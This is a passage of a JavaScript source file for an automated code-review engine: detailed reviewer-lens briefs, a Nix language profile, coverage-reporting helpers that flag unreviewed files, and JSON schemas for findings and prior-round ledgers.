    'api-boundary': 'API boundary correctness for web services: trace every error the changed service/repository can produce to the HTTP status the handler actually returns. A domain Conflict / AlreadyExists / unique-violation / not-found (an empty fetch_one / zero-row / RowNotFound) that collapses into a generic 500 — because a broad `#[from]` on the error enum folds it into a catch-all variant, or a blanket DbError→500 in IntoResponse swallows it — instead of surfacing 409/400/404 is a finding. Method: walk the error enum `#[from]`/`From` chains and the IntoResponse/handler match arms; where the service intends a distinct typed status (a Conflict variant meaning 409, a validation error meaning 400, a not-found meaning 404) confirm a matching arm actually maps it, and flag any typed 4xx that has no variant to land in or that a `#[from]` merges into a generic error before the boundary sees it. Also OpenAPI/utoipa completeness: does the handler annotation (e.g. #[utoipa::path] responses(...)) list EVERY status the handler can actually return — cross-check the statuses the code produces (especially 404/409/400) against the documented response set, and flag any the code returns but the responses(...) omits.',
    reconciler: 'reconciler / controller and retry-loop correctness. READ the craft:distributed-races catalogue (its path is in the RACE CATALOGUE line below): it holds the question, the answer needed and WHERE to read it for every class R1–R15. A reconcile must converge from every state another actor can leave behind. First MAP the primary object, every child it writes, every object it READS that another controller owns, and every requeue/error outcome the pass can return. Then answer each class from its carrier, not from comments, for EVERY instance in the diff, not the first convenient one. R1–R6 need evidence from OUTSIDE the diff: (R1) self-triggering write — enumerate EVERY write to the primary in a pass, including the status/conditions the generic driver/error path writes on every pass (holds and errors included): does it change a field every pass (lastTransitionTime), does the primary\'s own watch (no predicate / no generation filter) re-enqueue it sooner than the requeue the code relies on, and is it skipped when nothing changed? (R2) wake source — for EVERY outcome the requeue/error policy can return (await-change included), what event or timer guarantees a pass by the deadline the code promises? None → the bound is fiction. (R3) foreign stale cache — not our own stale read (that is R12): for EACH object another controller owns that a release/delete/label removal depends on, name that controller and its observed-generation gate (an applied/desired generation pair, e.g. status.observedGeneration vs metadata.generation); can it still act (recreate a child from the OLD template) after we decided from its absent/finished state? The decision must wait until its observed generation catches up. Read that controller\'s code. (R4) permissions — check every API verb/resource the diff newly calls against the shipped Role/ClusterRole/chart; a missing grant is a 403 only a real cluster shows. (R5) protection released on a change of intent (spec) instead of end of use, when the consumer outlives the spec. (R6) migration window — objects created before this change lack a field/label/status the new logic relies on: what does the new code do with them, delete path included? R7–R15 (create/patch divergence, partial-failure strand, cleanup, status churn, feature gate, 409/404 race, swallowed error with no timer, strict decode on a shared stream, webhook failurePolicy) — work them from the catalogue. If the catalogue cannot be read, R1–R6 above stand on their own and you say so. A question you cannot answer from evidence is an open finding, not a pass; name the interleaving or request order that produces the bad state.',
    'failure-windows': 'durability & failure windows BETWEEN the writes of one pass, and interleavings BETWEEN two controllers. Not in-process concurrency (locks, Send/Sync, blocking in async) — that is the concurrency lens; here every window is opened by a process that stopped or an API call that failed between two committed writes. Work it as a procedure, in order. (1) ENUMERATE every mutating API request the changed path issues, IN EXECUTION ORDER — CREATE, status PATCH, finalizer PATCH, DELETE, annotation write — as a numbered list; if you cannot write the list, say so instead of judging the path. (2) For EACH ADJACENT PAIR in that list, assume the first committed and the second returned 500 or the process died between them, and answer one question: what does the NEXT pass read, and does it recover? A value captured in THIS pass in memory (a mode, an origin, a derived name) and written only by a LATER request is LOST when that later request never lands; and a recovery path that re-derives it by name reads whichever object CURRENTLY carries that name — possibly a different object. Name the pair and the state it strands. (3) For each object this controller SHARES with another controller, play the interleaving out: A reads the object, B begins deletion and scans for dependents, A commits its create AFTER that scan. A one-shot dependency scan is not a guard — say what the scan would have to be (a re-check after the write, a finalizer, a conflict-detecting write) for the window to close. (4) For each guard that REFUSES an operation while its source is terminating, ask whether the counterparty WAITING on that operation counts the refused object as in-progress. Refusal plus waiting is a mutual block, and it is fixed by handling the never-started case, not by raising a timeout. REPORT SHAPE: a finding must name the REQUEST ORDER that produces the state (pair i→i+1, or the two-controller interleaving), and must say explicitly what that order does NOT establish — the behaviour of the live external system, or actual data loss — so the claim is exactly the size of its evidence.',
    maintainability: 'maintainability & structural simplification (load the refactoring skill): missed code judo — a behavior-preserving reframing using the existing architecture that would make this change dramatically simpler or delete a whole category of complexity; file pushed across ~700 lines (decomposition smell); ad-hoc conditional / one-off branch / scattered special-case spliced into an unrelated or shared flow instead of a dedicated abstraction; needless optionality (Option that always holds), as-casts where From/TryFrom belongs, Box<dyn Any>/downcasting where a typed model fits. Flag only concrete, behavior-preserving restructurings the author could have taken — not hypothetical rewrites.',
    tests: 'tests as a COVERAGE ADVERSARY (not a presence check): enumerate what a regression could SILENTLY break, then check each has a test that would FAIL on that regression. The litmus test: if you deleted the production line/branch that carries a contract, would the suite still pass green? If yes, that contract is UNTESTED → finding (cite the missing test). Cover, at minimum: (a) every NEW branch and every distinct ERROR CONTRACT the code / handler / OpenAPI (or other documented interface) promises — not-found→404, forbidden / wrong-owner, bad-request→400, conflict→409, a typed 4xx that must not collapse into a 500 — each needs a test asserting THAT status/error, not just the happy path; (b) every SECURITY / AUTHORIZATION boundary — tenant or owner isolation: is there a test exercising a DIFFERENT user/tenant/scope and ASSERTING denial? A single-user happy path does NOT prove isolation; on a NEW authz-guarded endpoint a missing cross-tenant/cross-owner denial test is a HIGH-severity gap; (c) every behavioral CLAIM in the stated spec — identity preserved / "in place", a state that must stay put or transition exactly once, a field that must be scrubbed, an idempotent no-op — each needs a test that pins it and would fail if the claim were violated; (d) self-exclusion / dedup / unlink / bookkeeping guards — a uniqueness check that must exclude the row itself, a back-reference that must be cleared. Vacuous tests (assert!(true), no assertions) count as absent coverage.',
    intent: 'intent / spec conformance: does the change actually do what it is supposed to do? Work from the STATED SPEC / AUTHOR CLAIMS block (the verbatim PR/commit description), not just the one-line inferred intent. ENUMERATE every explicit claim or invariant the author wrote — patterns like "never fails on X", "the only way to Y", "idempotent" / "no-op", "in place" / "preserves Z", "always" / "never", and any documented trade-off — and for EACH claim trace the concrete code path that would carry it out. A claim the code contradicts is a finding (cite the exact file:line that violates it): e.g. an "idempotent no-op" that actually wipes a field, "the only way to change X" that silently no-ops for some inputs, "never fails on X" that returns Err on a transient/non-NotFound error. Also flag correct-looking code with wrong behavior, missed requirements, off-by-one against the spec.\n\nSECOND HALF, AND IT IS THE ONE THAT GETS SKIPPED: the author also makes claims INSIDE the diff, and those are checkable the same way. Enumerate every assertion carried by a doc comment, an inline comment stating an invariant or an ordering ("only after X", "never reached when Y", "callers guarantee Z"), a `# Safety`/`# Panics` section, a test name, or a test docstring — and for EACH one find the line that would have to be true for it, and check it. Three specific shapes, all observed in real reviews: (a) a comment that describes behaviour the code around it no longer has, because the code changed in this very diff and the paragraph above it did not — a stale comment is not a style nit, it is a false statement the next reader will act on; (b) a contract doc that contradicts the call site the diff creates (the doc says "called only where P holds" and the new caller does not establish P); (c) a test whose name or docstring claims an invariant the body does not pin — most often because BOTH sides of the assertion are hardcoded to the same constant, or because every case in the table varies nothing that the code under test reads, so the assertion is true whatever the production code does. For (c) apply the deletion litmus: name the production line the test claims to protect, and say whether the test would still pass with that line deleted. Report each as: the claim verbatim, where it is written, and the file:line that falsifies it — an unestablished premise IS the finding, you do not need a crash to report it.',
    invariants: 'domain invariants & lifecycle: before judging a changed operation, read the invariants documented or enforced on the TYPES it manipulates (grep the domain/entity/service modules for doc-comment invariants, status/state enums, `effective_*` / derived getters, `*_scoped` reference ids, validation fns, and transient two-phase lifecycle states — a pending-delete/soft-delete window or an in-progress-mutation state). Flag where the change (a) accepts an entity in a transient/invalid lifecycle state, (b) crosses a scope boundary (a tenant/project/network/address-range) without re-validating or re-deriving the scoped references it carries, (c) uses a raw value where a documented derived/effective quantity is required, (d) mutates/scrubs one field but not a sibling field the same invariant governs, or (e) REIMPLEMENTS an eligibility / capacity / compatibility / authorization check that an EXISTING sibling function already performs — grep for the function doing the same job (a catalog/availability filter, a permission gate, a `*_available` / `filter_*` / `*_has_room` predicate) and diff the new path against it DIMENSION BY DIMENSION; flag any FAIL-CLOSED dimension the sibling enforces but the new path drops (a hardware/family/version compatibility filter, a missing-data→unavailable rule, an overcommit/effective-quantity conversion), because the two gates disagree the moment one is missing a dimension — that is a present correctness bug, not merely future drift. MIRROR WALK (run this when the diff touches a protocol, a state machine, a codec, or any two-sided contract — the finding IS the asymmetry, you do not need a crash to report it): (1) ENUMERATE the invariants the code must uphold — the error enum is the index, each variant names a rule someone decided to enforce, and the spec/RFC and doc comments name the rest; (2) for each invariant GREP EVERY ENFORCEMENT SITE (the guard, the version check, the bounds/limit test, the capability predicate); (3) for each site ask where its MIRROR is and whether it is guarded the same, along four axes — client↔server (the server rejects X, does the client?), send↔receive (the outgoing value is filtered, is the incoming one re-validated?), offered↔accepted (we constrain what we offer, do we constrain what we accept back?), one-param↔all-params (one negotiated parameter is validated, are its siblings — version, algorithm, limit, scope?). Missing siblings travel in packs; (4) DIFF EACH CANDIDATE AGAINST THE LAST RELEASED TAG (`git diff <tag> -- <file>`): a guard PRESENT in the release and GONE at HEAD is a regression, and that raises its severity — say which it is. Report each as: the invariant, enforced-at file:line, missing-mirror-at file:line, which axis, and what the gap lets through downstream (a panic, a silent drop, a downgrade, an accepted-but-should-be-rejected message).',
    compat: 'backward compatibility: what every party still holding the OLD shape makes of the change — data written by earlier versions, replicas not yet rolled, scripts and charts pinned to the last release, clients that never upgrade, repositories that reference a name. READ the craft:compatibility catalogue (its path is in the COMPATIBILITY CATALOGUE line below): it holds the question, the answer needed and WHERE to read it for every class C1–C13. Your pathspec shows only this profile\'s source files, and much of the contract is not in them: ALSO run the same `git diff` range with NO pathspec (`--stat` first) and read every changed CRD, chart template and values file, config, env read, CLI definition, IDL (proto/OpenAPI), migration and doc. First MAP every surface the diff changes that something OUTSIDE this version reads, calls or deploys against, and name its consumers. Then answer each class from its carrier, for EVERY instance in the diff, not the first convenient one. These classes need evidence from OUTSIDE the diff: (C1) old data under the new shape — data already persisted (JSONB/blob/enum columns, caches, event logs, queue payloads, state files, objects in a cluster store) under the OLD shape: does it still decode under the new one with no backfill (a rename with no alias, a new required field with no default, a reordered variant, a changed storage key)? (C2) rolling deploy, BOTH directions — old and new replicas run concurrently: new writers must still emit what old readers require AND new readers must accept what old writers emit; a bare rename breaks old readers — keep the serialized key stable or split the flip across two deploys. (C3) read-only alias — an alias / fallback / accept-both covers only new-code-reads-old-data, NOT old code reading new data during a rollout or after a rollback; call that asymmetry out explicitly. (C4) migration vs running code — a migration renames/retypes/drops/tightens a column or enum the still-running old code reads or writes. (C8) schema field narrowed — a CRD/JSON-Schema/OpenAPI field removed (structural schemas prune it silently), made required, enum shrunk, pattern/range tightened or retyped while old objects or clients exist. (C9) API version lifecycle — a new version with no conversion, the storage version switched with no migration of stored objects, a version no longer served (or dropped while still in status.storedVersions) while clients or objects use it. (C11) rollout order across components — every allowed upgrade order works: new controller + old chart/CRDs (helm upgrade does not update crds/), old controller + new CRD, new client + old server, old client + new server. (C12) renamed exported identifier — an export, route/RPC, metric or label, event type, CLI subcommand, plugin skill/agent/workflow name that consumers reference: grep every consumer of the OLD name, repo-wide and in docs/charts/dashboards. (C13) regression or standing state — diff each surface against the LAST RELEASED TAG (`git describe --tags --abbrev=0`, then `git diff <tag> -- <surface>`): a contract present in the release and gone at HEAD is a regression and raises severity; one already shipped is a standing state — say which. C5–C7 and C10 (CLI flags/exit codes/output format, config keys/env vars/Helm values, changed defaults, proto/OpenAPI breaks) — work them from the catalogue. If the catalogue cannot be read, the classes above stand on their own and you say so. A question you cannot answer from evidence is an open finding, not a pass; name the old party, the new shape and the sequence (write → upgrade → read, or the deploy order) that breaks.',
    'negative-space': 'negative space / cross-surface interaction: the bug the diff ENABLES in UNCHANGED code. A new status/type/enum-variant/column that pre-existing endpoints mutate blindly; a latent bug in an unchanged helper the diff makes reachable for the first time.',
  },
}
PROFILES['nix'] = {
  id: 'nix',
  lang: 'Nix',
  detect: (/** @type {string[]} */ files) => files.some(f => /\.nix$/.test(f) || /(^|\/)flake\.lock$/.test(f)),
  diffGlobs: ["'*.nix'", "'flake.lock'"],
  rubricSkill: 'nix-review',
  fpRules: '',
  rollupRuleIds: [],
  navSkill: '',
  reviewerAgent: 'craft:nix-reviewer',
  securityHints: 'secrets handling (agenix/sops-nix), fetchers/hashes, module security options, or build-script interpolation',
  usesLibrary: false,
  alwaysLenses: ['intent'],
  safetyLens: 'injection',
  scoutRules: `Decide what is "in play" from the diff: derivations / fetchers / hashes → packaging+purity; flake inputs / flake.lock / IFD → reproducibility; string interpolation into build or shell scripts → injection; devShell / direnv / formatters → dev-env; NixOS or home-manager modules / options / secrets → modules; dead or anti-idiomatic Nix → maintainability. ('intent' is enforced by the engine and added automatically — do not count it toward your choices.)`,
  gate: nixGate,
  depContext: nixDepContext,
  lenses: ['purity', 'reproducibility', 'injection', 'packaging', 'dev-env', 'modules', 'maintainability', 'intent'],
  lensBrief: {
    purity: 'purity: impure builtins (currentTime/getEnv/<nixpkgs>), fetchers without a fixed hash — anything that makes a build non-reproducible (PUR-*).',
    reproducibility: 'reproducibility: unpinned/channel inputs, missing flake.lock entries, import-from-derivation (IFD), --impure reliance (REP-*).',
    injection: 'injection: untrusted values interpolated into build or shell scripts; builtins.exec (INJ-*).',
    packaging: 'packaging: mkDerivation correctness — dep hashes (cargoHash/vendorHash/npmDepsHash), builder choice, phases, meta/license (PKG-*).',
    'dev-env': 'dev-env: devShell/direnv correctness, writeShellApplication, the allowUnfree-not-propagated-to-nix-develop gotcha (DEV-*).',
    modules: 'modules: NixOS/home-manager option typing and defaults, cross-platform (Linux+Darwin), secrets kept out of the world-readable store — agenix/sops-nix (MOD-*).',
    maintainability: 'maintainability: dead code (deadnix), anti-idioms (statix), needless rec/with, over-abstraction (MNT-*).',
    intent: 'intent / spec conformance: does the change do what it should? Work from the STATED SPEC / AUTHOR CLAIMS block (the verbatim PR/commit description), not just the one-line inferred intent. ENUMERATE every explicit claim or invariant the author wrote — patterns like "never fails on X", "the only way to Y", "idempotent" / "no-op", "in place" / "preserves Z", "always" / "never", documented trade-offs — and for EACH claim trace the concrete code path that would carry it out; a claim the code contradicts is a finding (cite the exact file:line). Also flag correct-looking code with wrong behavior.',
    'negative-space': 'negative space / cross-surface interaction: the breakage the diff ENABLES in UNCHANGED Nix — a renamed option or output that existing modules/consumers still reference; a changed default that unchanged config relies on.',
  },
}

// ================= Coverage honesty =================
// A verdict must never claim more coverage than the run had. The engine only knows the profiles
// declared above; everything else in a diff is UNREVIEWED, and saying so is the whole point of the
// helpers below. They are pure, so they live in lib/review-coverage.mjs — a real, importable,
// linted module with real unit tests — and are pasted back in here by the craft-inline gate. The
// language roster they need is the mutable PROFILES table above, so it is passed in as an argument
// rather than read: that argument is exactly what keeps them extractable.

// >>> craft-inline lib/review-coverage.mjs supportedLangLabel resolveProfilePin unknownPinMessage noLanguageMessage noChangedFilesMessage INERT_EXT INERT_NAMES GENERATED_PATH GENERATED_FILE isInertUncovered materialUncovered ANCILLARY_NAMES ANCILLARY_PATH isAncillaryConfig coverageGapFiles resolveCoverage nothingToReviewMessage uncoveredNotRunNote verdictSuffix telemetryLostSection
/** @param {Record<string, {lang: string}>} profiles */
function supportedLangLabel(profiles) {
  return Object.values(profiles).map(p => p.lang).join('/')
}

/**
 * @param {Record<string, unknown>} profiles
 * @param {unknown} requested
 * @returns {{pinned: string[] | null, unknown: string[]}}
 */
function resolveProfilePin(profiles, requested) {
  if (!requested) return { pinned: null, unknown: [] }
  const list = /** @type {unknown[]} */ (Array.isArray(requested) ? requested : [requested])
    .filter(/** @returns {id is string} */ id => typeof id === 'string')
    .map(id => id.trim().toLowerCase())
    .filter(Boolean)
  if (!list.length) return { pinned: null, unknown: [] }
  const uniq = [...new Set(list)]
  return { pinned: uniq.filter(id => !!profiles[id]), unknown: uniq.filter(id => !profiles[id]) }
}

/**
 * @param {Record<string, unknown>} profiles
 * @param {string[]} unknown
 */
function unknownPinMessage(profiles, unknown) {
  /** @param {string[]} xs */
  const q = xs => xs.map(x => `\`${x}\``).join(', ')
  return `unknown language pin ${q(unknown)} — available: ${q(Object.keys(profiles))}`
}

/**
 * @param {Record<string, {lang: string}>} profiles
 * @param {number} fileCount
 * @param {number} [materialCount]
 */
function noLanguageMessage(profiles, fileCount, materialCount = fileCount) {
  return `NOTHING WAS REVIEWED — none of the ${fileCount} changed file(s) match a supported language profile (this engine reviews ${supportedLangLabel(profiles)} only), and ${materialCount} of them carry reviewable content that therefore went unreviewed. This is not an approval: no lens ran and no finding could have been produced.`
}

function noChangedFilesMessage() {
  return `NOTHING WAS REVIEWED — the diff came back EMPTY: no changed file was detected against the resolved base. Either there is genuinely nothing to review here (an already-merged branch, or a \`path\` scope that matches nothing) or the base/scope is wrong and detection failed. No lens ran, so this is not an approval — check the base and re-run.`
}

const INERT_EXT = /\.(md|markdown|rst|adoc|svg|png|jpe?g|gif|ico|webp|pdf|woff2?|ttf|otf)$/i

const INERT_NAMES = new Set([
  'license', 'licence', 'notice', 'codeowners', '.gitignore', '.gitattributes',
  'license.txt', 'licence.txt', 'notice.txt', 'copying.txt', 'authors.txt', 'contributors.txt',
  'changelog.txt', 'changes.txt', 'readme.txt', 'robots.txt', 'humans.txt', 'todo.txt', 'notes.txt',
  'package-lock.json', 'npm-shrinkwrap.json', 'pnpm-lock.yaml', 'yarn.lock', 'bun.lockb', 'bun.lock',
  'cargo.lock', 'flake.lock', 'poetry.lock', 'pdm.lock', 'uv.lock', 'pipfile.lock', 'gemfile.lock',
  'composer.lock', 'go.sum', 'deno.lock', 'mix.lock', 'pubspec.lock', 'podfile.lock', 'packages.lock.json',
  'gradle.lockfile', 'cabal.project.freeze', 'conan.lock', 'herd.lock',
])

const GENERATED_PATH = /(^|\/)(__generated__|generated|node_modules|vendor)\//i

const GENERATED_FILE = /(\.snap|\.min\.(js|css|mjs|cjs)|\.pb\.(go|cc|h|rs|ts)|_pb2(_grpc)?\.py|\.gen\.(go|rs|ts)|\.generated\.[a-z0-9]+|\.g\.dart)$/i

/** @param {unknown} f */
function isInertUncovered(f) {
  const base = /** @type {string} */ (String(f).split('/').pop()).toLowerCase()
  return INERT_EXT.test(String(f)) || INERT_NAMES.has(base) || GENERATED_PATH.test(String(f)) || GENERATED_FILE.test(String(f))
}

/** @param {unknown[]} files */
function materialUncovered(files) {
  return files.filter(f => !isInertUncovered(f))
}

const ANCILLARY_NAMES = new Set([
  'dockerfile', 'containerfile', 'justfile', 'makefile', 'gnumakefile', 'procfile', 'vagrantfile',
  'deny.toml', 'rustfmt.toml', 'clippy.toml', 'rust-toolchain.toml', 'rust-toolchain',
  '.editorconfig', '.dockerignore', '.npmrc', '.nvmrc', '.prettierrc', '.eslintrc',
  'codecov.yml', 'renovate.json', 'dependabot.yml', '.pre-commit-config.yaml',
])

const ANCILLARY_PATH = /(^|\/)(\.github|\.gitlab|\.circleci|\.woodpecker|\.buildkite)\//i

/** @param {unknown} f */
function isAncillaryConfig(f) {
  const p = String(f)
  const base = /** @type {string} */ (p.split('/').pop()).toLowerCase()
  return ANCILLARY_NAMES.has(base) || ANCILLARY_PATH.test(p) || /\.dockerfile$/i.test(base)
}

/** @param {unknown[]} files */
function coverageGapFiles(files) {
  return materialUncovered(files).filter(f => !isAncillaryConfig(f))
}

/**
 * @template {{lang: string}} P
 * @param {{profiles: Record<string, P>, changedFiles: unknown, detectedActive: unknown, pinnedLangs: unknown}} args
 * @returns {{outcome: string, active: P[], material: unknown[]}}
 */
function resolveCoverage({ profiles, changedFiles, detectedActive, pinnedLangs }) {
  const files = /** @type {unknown[]} */ (Array.isArray(changedFiles) ? changedFiles : [])
  const detected = /** @type {P[]} */ (Array.isArray(detectedActive) ? detectedActive : [])
  if (!files.length) return { outcome: 'empty', active: [], material: [] }
  const material = materialUncovered(files)
  if (!material.length && !detected.length) return { outcome: 'nothing-to-review', active: [], material }
  let active = detected
  if (!active.length && Array.isArray(pinnedLangs) && pinnedLangs.length) active = /** @type {string[]} */ (pinnedLangs).map(id => /** @type {P} */ (profiles[id]))
  if (!active.length) return { outcome: 'no-profile', active: [], material }
  return { outcome: 'review', active, material }
}

/** @param {number} fileCount */
function nothingToReviewMessage(fileCount) {
  return `NOTHING NEEDED REVIEWING — all ${fileCount} changed file(s) are documentation, assets, lockfiles or generated output; none carries reviewable code. No lens ran because none had anything to look at.`
}

/** @param {unknown[]} material */
function uncoveredNotRunNote(material) {
  const shown = material.slice(0, 5).join(', ')
  return `${material.length} changed file(s) matched no language profile and were NOT reviewed (${shown}${material.length > 5 ? `, +${material.length - 5} more` : ''})`
}

/** @param {{notRun?: unknown[], coverageNotes?: unknown[], floorPremiseHeld?: boolean}} [opts] */
function verdictSuffix({ notRun = [], coverageNotes = [], floorPremiseHeld = true } = {}) {
  if (notRun.length || !floorPremiseHeld) return ' (INCOMPLETE)'
  if (coverageNotes.length) return ' (PARTIAL COVERAGE)'
  return ''
}

/** @param {unknown} lost */
function telemetryLostSection(lost) {
  const lines = /** @type {unknown[]} */ (Array.isArray(lost) ? lost : []).filter(l => String(l ?? '').trim())
  if (!lines.length) return ''
  const landed = lines.filter(l => /^the run directory \(the record itself landed\)/.test(String(l)))
  const unconfirmed = lines.length - landed.length
  const head = unconfirmed
    ? `${unconfirmed} record write(s)/read(s) for this run could not be confirmed, so the run store may be missing or incomplete for it. Read the verdict below — not the store — for what this run actually did.`
    : `This run's record is in the store, but ${landed.length} run director${landed.length === 1 ? 'y' : 'ies'} could not be folded into it, so what those held is not there. Read the verdict below for what this run actually did.`
  return [
    unconfirmed ? `## ⚠️ Telemetry lost` : `## ⚠️ Telemetry incomplete`,
    head,
    ...lines.map(l => `- ${String(l).replace(/[\r\n]+/g, ' ').slice(0, 300)}`),
    ``,
    ``,
  ].join('\n')
}
// <<< craft-inline

// ---- shared schemas ----
const FINDING_ITEM = {
  type: 'object',
  additionalProperties: false,
  required: ['severity', 'title', 'file', 'line', 'why', 'fix', 'blastRadius', 'source', 'ruleId', 'whereChecked'],
  properties: {
    severity: { type: 'string', enum: ['Critical', 'High', 'Medium', 'Low', 'Info'] },
    title: { type: 'string', description: 'one-line what is wrong' },
    file: { type: 'string', description: 'path; empty string if not applicable' },
    line: { type: 'integer', description: '1-based line; 0 if not applicable' },
    why: { type: 'string', description: 'why it matters' },
    whereChecked: { type: 'string', description: 'OFF-SITE EVIDENCE: the file:line you actually opened to establish a load-bearing premise that lives OUTSIDE the cited defect site — a dependency\'s behaviour, reachability from an entry point, the absence of a guard in a caller, what a sibling path does. Several may be comma-separated, each with a few words on what it shows. Empty string ONLY when the finding is fully self-contained at the cited file:line and rests on no off-site claim' },
    fix: { type: 'string', description: 'direction of the fix' },
    blastRadius: { type: 'string', description: 'callers affected / breaking-change note; empty if n/a' },
    source: { type: 'string', description: 'lens name or tool name that produced this' },
    ruleId: { type: 'string', description: 'catalog rule ID from the active profile\'s rules.md (e.g. "CON-003" for rust, "PUR-001" for nix) if the finding maps to one; empty string otherwise' },
    fp: { type: 'string', description: 'line-tolerant fingerprint; empty if not from a ledger' },
    symbol: { type: 'string', description: 'enclosing fn/type name; empty if unknown' },
    tier: { type: 'string', description: 'confirmed|suspected|unverified|refuted; empty if n/a' },
    disposition: { type: 'string', description: 'open|closed|rejected|justified|deferred; empty if n/a' },
  },
}

// The persisted ledger entry has its OWN shape (the 11 required fields `toLedgerEntry` always writes,
// plus an OPTIONAL `sources` — see below) — NOT FINDING_ITEM. Reusing FINDING_ITEM here would require
// `fix`/`blastRadius` (which the ledger omits), so a strict validator could reject the loader's output
// and null out `priorRound`, silently degrading a re-review to a first pass. `sources` is optional (not
// in `required`) so pre-existing ledgers written without it still validate; it is persisted so the
// strict-mode maintainability escalation (isMaintainability's merged-`sources` clause) survives a
// re-review — without it the reconstructed prior has no `sources` and the escalation silently no-ops.
const LEDGER_ITEM = {
  type: 'object',
  additionalProperties: false,
  required: ['fp', 'file', 'line', 'symbol', 'severity', 'tier', 'disposition', 'source', 'ruleId', 'title', 'why'],
  properties: {
    fp: { type: 'string' },
    file: { type: 'string' },
    line: { type: 'integer' },
    symbol: { type: 'string' },
    severity: { type: 'string' },
    tier: { type: 'string' },
    disposition: { type: 'string' },
    source: { type: 'string' },
    sources: { type: 'array', items: { type: 'string' } },
    ruleId: { type: 'string' },
    title: { type: 'string' },
    why: { type: 'string' },
    // Optional (not in `required`): present only on an item whose `why` the loader script shortened for
    // transport, and it points at where the FULL `why` is recoverable — the finding's birth record: a
    // finalized record filename, or a surviving partial-directory basename for an evidence-recovery item.
    // The schema must PERMIT it so the loader's verbatim copy validates — additionalProperties
    // is false, so an emitted `whyRef` the schema did not name would null out the whole prior round.
    whyRef: {
      type: 'object',
      additionalProperties: false,
      required: ['record', 'fp'],
      properties: {
        record: { type: 'string' },
        fp: { type: 'string' },
      },
    },
  },
}

/** @type {Schema<PriorRoundAnswer>} */
const PRIOR_ROUND_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['found', 'round', 'head', 'ledger', 'ledgerCount', 'priorFindings', 'journalSourced', 'reason'],
  properties: {
    found: { type: 'boolean' },
    round: { type: 'integer', description: 'the prior round number; 0 when found=false' },
    head: { type: 'string', description: 'prior HEAD sha; empty when found=false' },
    ledger: { type: 'array', items: LEDGER_ITEM, description: 'prior findings with fp/symbol/tier/disposition; empty when found=false' },
    ledgerCount: { type: 'integer', description: 'the ledger length the script computed — copy it as printed; the workflow checks it against the array it received and treats a mismatch as a truncated transport' },
    reason: { type: 'string', description: 'why there is no prior round (no-store, no-index, no-candidate-rows, unattributable-rows-only, ancestry-rejected, detail-unreadable, partial-only, git-unavailable); empty when found=true' },
    priorFindings: { type: 'integer', description: 'total findings the prior round reported (its record findings.total); 0 when found=false or unknown — used to detect a round that found bugs but persisted no ledger' },
    journalSourced: { type: 'boolean', description: 'true when this ledger was reconstructed from a stalled run\'s journal.jsonl rather than a normal completed round; false when found=false. Its `head` may equal the OPERATOR\'S current HEAD (a re-run on the same stalled commit before any fix), so the workflow must not diff head...HEAD off it — see shouldFullRescan.' },
    sameFpBasis: { type: 'boolean', description: 'true when the prior round fingerprinted its findings under the SAME basis as this round (the basis is not the engine revision: a telemetry-only revision bump keeps it); false when it differs or is unknown, and when found=false. The recidivism/tombstone check compares fp only when this is true. Copy it exactly as the loader printed it, and OMIT it when the loader did not print it — never supply a value of your own: an omitted value is reported as a lost basis verdict.' },
    fpBasisKnown: { type: 'boolean', description: 'true when the loader could establish the prior round\'s fingerprint basis at all; false when it could not (a round recovered from a stopped run whose checkpoints do not attest to one basis, an unreadable record, a record with no revision or a newer one). Copy it exactly as the loader printed it, and omit it when the loader did not print it.' },
    priorFpRevisions: { type: 'array', items: { type: 'integer' }, description: 'the raw engine revisions the prior round\'s fingerprints were minted under (empty when none can be established). The ENGINE decides comparability from these with its own table. Copy it exactly as the loader printed it, and omit it when the loader did not print it.' },
    priorFpRevisionsCheck: { type: 'string', description: 'the same revisions as a comma-separated string, printed by the loader next to priorFpRevisions so the engine can tell the array survived transport. Copy it exactly as printed, and omit it when the loader did not print it.' },
  },
}

/** @type {Schema<DetectAnswer>} */
const DETECT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['baseRef', 'files', 'spec', 'branch', 'head', 'notes'],
  properties: {
    baseRef: { type: 'string', description: 'git ref the diff was computed against; empty if none resolved' },
    files: { type: 'array', items: { type: 'string' }, description: 'changed file paths in the diff' },
    spec: { type: 'string', description: 'verbatim change description — the open PR title+body, else the commit messages on the diff range; truncated to ~4000 chars; empty string if none' },
    branch: { type: 'string', description: 'current git branch name; empty string if detached HEAD' },
    head: { type: 'string', description: 'current HEAD short SHA; empty string if not a git repo' },
    notes: { type: 'string', description: 'one line on what was detected' },
  },
}

// Scout classifies; it does not budget. maxRounds/verifyVotes/lensModel are deterministic functions
// of sizeBucket (RIGOR_BY_SIZE below), so the script derives them instead of asking a haiku to
// recite a lookup table it could contradict — the same reason the "always" lenses are enforced in
// code rather than in the prompt.
/** @type {Schema<ScoutAnswer>} */
const SCOUT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['sizeBucket', 'lenses', 'isLibrary', 'securitySensitive', 'intent', 'churn', 'notes'],
  properties: {
    sizeBucket: { type: 'string', enum: ['small', 'medium', 'large'] },
    lenses: { type: 'array', items: { type: 'string' }, description: 'subset of the profile lens catalog to run' },
    isLibrary: { type: 'boolean', description: 'true if a published library (→ semver-checks); always false where not applicable' },
    securitySensitive: { type: 'boolean' },
    intent: { type: 'string', description: 'what the change should do, from the brief/args; empty if unknown' },
    churn: { type: 'array', items: { type: 'string' }, description: 'hot/often-changed files to scrutinize; may be empty' },
    notes: { type: 'string', description: 'one line on what was detected' },
    // realm @nick/craft #102: OPTIONAL by design — and NOT in `required` above on purpose. Its absence
    // (and a missing key within it) is what makes the surface gate fail-open: the gate drops a lens
    // only where the scout AFFIRMATIVELY set the needed surface false. Each key is likewise optional.
    surfaces: {
      type: 'object',
      additionalProperties: false,
      properties: {
        crossBoundarySymbol: { type: 'boolean', description: 'diff changes the signature/shape of an exported/pub symbol that unchanged code depends on' },
        wireForm: { type: 'boolean', description: 'diff changes a contract another version reads, calls or deploys against — CRD schema or API version, serde type, HTTP/OpenAPI, protocol, CLI flag/exit code/output format, config key, env var, Helm value, changed default, renamed exported name' },
        invariantType: { type: 'boolean', description: 'diff changes a type that carries an invariant other code relies on' },
      },
    },
  },
}

/** @type {Schema<GateAnswer>} */
const GATE_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['status', 'provenance', 'failedChecks', 'carriedChecks', 'seedFindings', 'notes'],
  properties: {
    status: { type: 'string', enum: ['pass', 'fail', 'unknown'] },
    provenance: { type: 'string', description: 'e.g. "build/test/clippy/fmt via CI #123; audit/deny local"' },
    failedChecks: { type: 'array', items: { type: 'string' } },
